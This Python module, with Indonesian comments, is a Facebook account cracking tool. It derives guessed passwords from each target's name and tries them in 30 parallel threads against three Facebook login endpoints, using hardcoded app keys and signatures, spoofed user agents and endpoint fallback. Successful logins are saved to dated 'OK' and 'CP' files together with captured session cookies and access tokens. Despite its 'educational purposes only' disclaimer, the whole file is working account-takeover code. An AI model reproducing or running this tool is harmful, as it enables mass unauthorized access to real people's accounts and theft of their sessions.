"""
Modul untuk crack Facebook account
Handle cracking dengan berbagai metode (b-api, graph, mobile)
Updated November 2025 - DISCLAIMER: Educational purposes only
WARNING: Endpoint lama sudah deprecated, kemungkinan tidak work 100%
"""

import time
import uuid
import random
import requests
import os
import hashlib
import threading
from datetime import datetime
from typing import List, Dict, Optional, Callable, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
from .utils import PasswordGenerator, UserAgentGenerator


class FacebookCracker:
    """
    Class untuk crack Facebook account
    
    DISCLAIMER: Educational purposes only. Unauthorized access adalah ilegal.
    Endpoint B-API sudah deprecated di 2025, success rate sangat rendah.
    """
    
    def __init__(self, max_workers: int = 30):
        self.api_key = '882a8490361da98702bf97a021ddc14d'
        self.api_secret = '62f8ce9f74b12f84c123cc23437a4a32'
        self.max_workers = max_workers
        self.stats_lock = threading.Lock()
        self.file_lock = threading.Lock()
        self.stats = {
            'total': 0,
            'ok': 0,
            'cp': 0,
            'failed': 0,
            'current': 0
        }
    
    def crack_single(
        self, 
        user_id: str, 
        name: str, 
        method: str = "mobile",
        auto_fallback: bool = True
    ) -> Optional[Dict]:
        """
        Crack single ID dengan metode tertentu + auto fallback
        
        Args:
            user_id: ID Facebook
            name: Nama user
            method: Metode crack (mobile/bapi/graph)
            auto_fallback: Auto-fallback ke method lain jika gagal
            
        Returns:
            Dict dengan hasil crack atau None jika gagal
        """
        passwords = PasswordGenerator.generate(name)
        
        failed_attempts = 0
        network_errors = 0
        
        for password in passwords:
            retry_count = 0
            max_retries = 2
            
            while retry_count < max_retries:
                try:
                    result = self._try_login(user_id, password, method)
                    if result:
                        return result
                    else:
                        failed_attempts += 1
                    
                    break
                    
                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
                    network_errors += 1
                    retry_count += 1
                    if retry_count < max_retries:
                        time.sleep(1)
                        continue
                    else:
                        failed_attempts += 1
                        break
                        
                except Exception as e:
                    failed_attempts += 1
                    break
            
            if failed_attempts < len(passwords):
                base_delay = 0.3 + (0.1 * min(failed_attempts // 5, 2))
                time.sleep(random.uniform(base_delay, base_delay + 0.3))
        
        if auto_fallback:
            fallback_methods = {
                "mobile": ["bapi", "graph"],
                "bapi": ["mobile", "graph"],
                "graph": ["mobile", "bapi"]
            }
            
            for fallback_method in fallback_methods.get(method, []):
                fallback_result = self.crack_single(
                    user_id, name, fallback_method, auto_fallback=False
                )
                if fallback_result:
                    return fallback_result
        
        return None
    
    def crack_batch(
        self,
        id_list: List[str],
        method: str = "mobile",
        progress_callback: Optional[Callable[[int, Dict], None]] = None,
        result_callback: Optional[Callable[[Dict], None]] = None
    ) -> Dict:
        """
        Crack batch IDs dengan PARALLEL PROCESSING seperti script original
        Menggunakan ThreadPoolExecutor dengan 30 workers untuk kecepatan maksimal
        
        Args:
            id_list: List ID|Name
            method: Metode crack (mobile/bapi/graph)
            progress_callback: Callback untuk update progress
            result_callback: Callback untuk hasil
            
        Returns:
            Dict statistik hasil crack
        """
        self.stats = {
            'total': len(id_list),
            'ok': 0,
            'cp': 0,
            'failed': 0,
            'current': 0
        }
        
        def process_single_id(idx_data):
            """Process single ID dengan thread-safe stats update"""
            idx, id_data = idx_data
            try:
                if "|" not in id_data:
                    with self.stats_lock:
                        self.stats['failed'] += 1
                        self.stats['current'] = idx
                    if progress_callback:
                        progress_callback(idx, self.stats.copy())
                    return None
                
                parts = id_data.split("|", 1)
                if len(parts) < 2:
                    with self.stats_lock:
                        self.stats['failed'] += 1
                        self.stats['current'] = idx
                    if progress_callback:
                        progress_callback(idx, self.stats.copy())
                    return None
                
                user_id, name = parts
                
                if not user_id or not name:
                    with self.stats_lock:
                        self.stats['failed'] += 1
                        self.stats['current'] = idx
                    if progress_callback:
                        progress_callback(idx, self.stats.copy())
                    return None
                
                with self.stats_lock:
                    self.stats['current'] = idx
                
                result = self.crack_single(user_id.strip(), name.strip(), method)
                
                if result:
                    with self.stats_lock:
                        if result['type'] == 'OK':
                            self.stats['ok'] += 1
                        elif result['type'] == 'CP':
                            self.stats['cp'] += 1
                    
                    with self.file_lock:
                        if result['type'] == 'OK':
                            self._save_result_ok(result)
                        elif result['type'] == 'CP':
                            self._save_result_cp(result)
                    
                    if result_callback:
                        result_callback(result)
                    
                    if progress_callback:
                        progress_callback(idx, self.stats.copy())
                    
                    return result
                else:
                    with self.stats_lock:
                        self.stats['failed'] += 1
                    
                    if progress_callback:
                        progress_callback(idx, self.stats.copy())
                    
                    return None
                
            except Exception as e:
                with self.stats_lock:
                    self.stats['failed'] += 1
                    self.stats['current'] = idx
                if progress_callback:
                    progress_callback(idx, self.stats.copy())
                return None
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            indexed_list = [(idx, id_data) for idx, id_data in enumerate(id_list, 1)]
            futures = {executor.submit(process_single_id, item): item for item in indexed_list}
            
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    pass
        
        return self.stats
    
    def _try_login(
        self, 
        user_id: str, 
        password: str, 
        method: str = "mobile"
    ) -> Optional[Dict]:
        """
        Try login dengan metode tertentu
        
        Args:
            user_id: ID Facebook
            password: Password
            method: Metode (mobile/bapi/graph)
            
        Returns:
            Dict hasil atau None
        """
        try:
            if method == "mobile":
                return self._try_login_mobile_api(user_id, password)
            elif method == "bapi":
                return self._try_login_bapi(user_id, password)
            elif method == "graph":
                return self._try_login_graph_api(user_id, password)
            else:
                return self._try_login_mobile_api(user_id, password)
        except Exception as e:
            return None
    
    def _try_login_mobile_api(self, user_id: str, password: str) -> Optional[Dict]:
        """
        Try login menggunakan Mobile API - METHOD DARI RUN.PY LINE 1912-1958
        
        EXACT IMPLEMENTATION dari fanky_api() di run.py yang WORKING!
        OPTIMIZED dengan better error handling
        
        Args:
            user_id: ID Facebook  
            password: Password
            
        Returns:
            Dict hasil atau None
        """
        session = requests.Session()
        try:
            session.headers.update({'Connection': 'keep-alive'})
            ua = UserAgentGenerator.get_random()
            
            # IMPORTANT: Data dari run.py line 1927 - EXACT STRUCTURE!
            data = {
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d',
                'email': user_id,
                'password': password,
                'credentials_type': 'password',
                'generate_session_cookies': '1',
                'error_detail_type': 'button_with_disabled',
                'format': 'json',
                'device_id': '1234567890abcdef',
                'cpl': 'true',
                'try_num': '1',
                'family_device_id': '1234567890abcdef',
                'login_latitude': '0.0',
                'login_longitude': '0.0',
                'login_location_accuracy_m': '1.0',
                'generate_machine_id': '1',
                'generate_analytics_claim': '1',
                'meta_inf_fbmeta': ''
            }
            
            # IMPORTANT: Generate MD5 signature seperti run.py line 1928-1929
            api_secret = '62f8ce9f74b12f84c123cc23437a4a32'
            sig_data = ''.join(f'{k}={data[k]}' for k in sorted(data)) + api_secret
            data['sig'] = hashlib.md5(sig_data.encode()).hexdigest()
            
            # IMPORTANT: Headers dari run.py line 1930
            headers = {
                'User-Agent': ua,
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'ef0e330bff1cd312f36aa5f2c69c59a9',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Connection': 'keep-alive',
                'Accept-Encoding': 'gzip, deflate'
            }
            
            # POST request seperti run.py line 1931
            response = session.post(
                'https://api.facebook.com/restserver.php',
                data=data,
                headers=headers,
                verify=True,
                timeout=20
            )
            
            if response.status_code != 200:
                return None
            
            try:
                result = response.json()
            except:
                return None
            
            # Check CHECKPOINT (run.py line 1933-1941)
            if "error_msg" in result:
                error_msg = result["error_msg"].lower()
                if "verify their account" in error_msg or "checkpoint" in error_msg:
                    return {
                        'success': True,
                        'type': 'CP',
                        'user_id': user_id,
                        'password': password
                    }
            
            # Check SUCCESS (run.py line 1942-1953)
            if "access_token" in result:
                try:
                    coki = session.cookies.get_dict()
                    cookie_str = (
                        f"datr={coki.get('datr', '')};"
                        f"sb={coki.get('sb', '')};"
                        f"locale=id_ID;"
                        f"c_user={coki.get('c_user', '')};"
                        f"xs={coki.get('xs', '')};"
                        f"fr={coki.get('fr', '')};"
                    )
                    
                    return {
                        'success': True,
                        'type': 'OK',
                        'user_id': user_id,
                        'password': password,
                        'cookie': cookie_str,
                        'token': result['access_token']
                    }
                except:
                    return None
            
            return None
            
        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
            raise
        except Exception as e:
            return None
        finally:
            session.close()
    
    def _try_login_bapi(self, user_id: str, password: str) -> Optional[Dict]:
        """
        Try login menggunakan B-API method - METHOD DARI RUN.PY LINE 2013-2059
        
        EXACT IMPLEMENTATION dari fanky_b_api() di run.py yang WORKING!
        
        Args:
            user_id: ID Facebook  
            password: Password
            
        Returns:
            Dict hasil atau None
        """
        session = requests.Session()
        try:
            user_agent = UserAgentGenerator.get_random()
            
            # IMPORTANT: Headers dari run.py (sebelum line 2031)
            headers = {
                "Host": "b-api.facebook.com",
                "Connection": "keep-alive",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": user_agent,
                "Accept-Encoding": "gzip, deflate",
                "Accept": "*/*",
                "X-FB-HTTP-Engine": "Liger",
                "X-FB-Client-IP": "True",
                "X-FB-Server-Cluster": "True"
            }
            
            # IMPORTANT: Params dari run.py line 2031 - EXACT VALUES!
            # Fixed signature: 3f555f99fb61fcd7aa0c44f58f522ef6
            params = {
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "format": "JSON",
                "sdk_version": "2",
                "email": user_id,
                "locale": "en_US",
                "password": password,
                "sdk": "android",
                "generate_session_cookies": "1",
                "generate_analytics_claim": "1",
                "generate_machine_id": "1",
                "method": "auth.login",
                "credentials_type": "password",
                "error_detail_type": "button_with_disabled",
                "source": "login",
                "meta_inf_fbmeta": "NO_FILE",
                "advertiser_id": str(uuid.uuid4()),
                "currently_logged_in_userid": "0",
                "device_id": str(uuid.uuid4()),
                "family_device_id": str(uuid.uuid4()),
                "session_id": str(uuid.uuid4()),
                "machine_id": str(uuid.uuid4()),
                "return_ssl_resources": "0",
                "try_num": "1",
                "email_type": "standard",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d",
                "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"  # FIXED dari run.py!
            }
            
            # GET request seperti run.py line 2032-2033
            url = "https://b-api.facebook.com/method/auth.login"
            response = session.get(url, headers=headers, params=params, timeout=30)
            
            result = response.json() if response.text else {}
            
            # Check CHECKPOINT (run.py line 2034-2042)
            if "error_msg" in result and "www.facebook.com" in result["error_msg"]:
                return {
                    'success': True,
                    'type': 'CP',
                    'user_id': user_id,
                    'password': password
                }
            
            # Check SUCCESS (run.py line 2043-2054)
            elif "access_token" in result:
                try:
                    coki = session.cookies.get_dict()
                    cookie_str = (
                        f"datr={coki.get('datr', '')}; "
                        f"sb={coki.get('sb', '')}; "
                        f"locale=id_ID; "
                        f"c_user={coki.get('c_user', '')}; "
                        f"xs={coki.get('xs', '')}; "
                        f"fr={coki.get('fr', '')};"
                    )
                    
                    return {
                        'success': True,
                        'type': 'OK',
                        'user_id': user_id,
                        'password': password,
                        'cookie': cookie_str,
                        'token': result['access_token']
                    }
                except:
                    return None
            
            return None
            
        except Exception as e:
            return None
    
    def _try_login_graph_api(self, user_id: str, password: str) -> Optional[Dict]:
        """
        Try login menggunakan Graph API method - METHOD DARI RUN.PY LINE 1960-2010
        
        EXACT IMPLEMENTATION dari fankygraphv1() di run.py yang WORKING!
        
        Args:
            user_id: ID Facebook
            password: Password
            
        Returns:
            Dict hasil atau None
        """
        try:
            ses = requests.Session()
            
            ua = UserAgentGenerator.get_random()
            url = "graph.facebook.com"
            
            # IMPORTANT: Params dari run.py line 1976 - EXACT VALUES!
            params = {
                "access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",  # FIXED dari run.py!
                "sdk_version": str(random.randint(1, 26)),
                "email": user_id,
                "locale": "zh_CN",
                "password": password,
                "sdk": "Android",
                "generate_session_cookies": "1",
                "sig": "4f648f21fb58fcd2aa1c65f35f441ef5"  # FIXED dari run.py!
            }
            
            # IMPORTANT: Headers dari run.py line 1977 - dengan x-fb-* headers
            headers = {
                "Host": url,
                "x-fb-sim-hni": str(random.randint(100000, 300000)),
                "x-fb-net-hni": str(random.randint(100000, 300000)),
                "x-fb-connection-quality": "EXCELLENT",
                "user-agent": ua,
                "content-type": "application/x-www-form-urlencoded",
                "x-fb-device-group": str(random.randint(1000, 4000)),
                "x-fb-friendly-name": "RelayFBNetwork_GemstoneProfilePreloadableNonSelfViewQuery",
                "x-fb-request-analytics-tags": "unknown",
                "accept-encoding": "gzip, deflate",
                "x-fb-http-engine": "Liger",
                "connection": "close"
            }
            
            # POST request seperti run.py line 1978
            response = ses.post(
                f"https://{url}/auth/login?locale=zh_CN",
                params=params,
                headers=headers,
                allow_redirects=False,
                timeout=30
            )
            
            response_text = response.text
            
            # Check CHECKPOINT (run.py line 1980-1988)
            if "User must verify their account" in response_text:
                return {
                    'success': True,
                    'type': 'CP',
                    'user_id': user_id,
                    'password': password
                }
            
            # Check SUCCESS (run.py line 1990-2000)
            elif "session_key" in response_text and "EAA" in response_text:
                try:
                    result = response.json()
                    cookie_str = ""
                    if 'session_cookies' in result:
                        cookie_str = ";".join(
                            f"{i['name']}={i['value']}" 
                            for i in result['session_cookies']
                        )
                    
                    token = result.get('access_token', '')
                    
                    return {
                        'success': True,
                        'type': 'OK',
                        'user_id': user_id,
                        'password': password,
                        'cookie': cookie_str,
                        'token': token
                    }
                except:
                    return None
            
            # Check RATE LIMIT (run.py line 2002-2005)
            elif "Calls to this api have exceeded the rate limit" in response_text:
                time.sleep(10)
                return None
            
            return None
            
        except Exception as e:
            return None
    
    def _save_result_ok(self, result: Dict):
        """
        Simpan hasil OK ke file
        
        Args:
            result: Dict hasil crack
        """
        try:
            os.makedirs("OK", exist_ok=True)
            
            today = datetime.now().strftime("%Y-%m-%d")
            filename = f"OK/OK-{today}.txt"
            
            with open(filename, "a", encoding="utf-8") as f:
                line = f"{result['user_id']}|{result['password']}"
                if 'cookie' in result and result['cookie']:
                    line += f"|{result['cookie']}"
                if 'token' in result and result['token']:
                    line += f"|{result['token']}"
                f.write(line + "\n")
                
        except Exception as e:
            pass
    
    def _save_result_cp(self, result: Dict):
        """
        Simpan hasil CP ke file
        
        Args:
            result: Dict hasil crack
        """
        try:
            os.makedirs("CP", exist_ok=True)
            
            today = datetime.now().strftime("%Y-%m-%d")
            filename = f"CP/CP-{today}.txt"
            
            with open(filename, "a", encoding="utf-8") as f:
                line = f"{result['user_id']}|{result['password']}\n"
                f.write(line)
                
        except Exception as e:
            pass
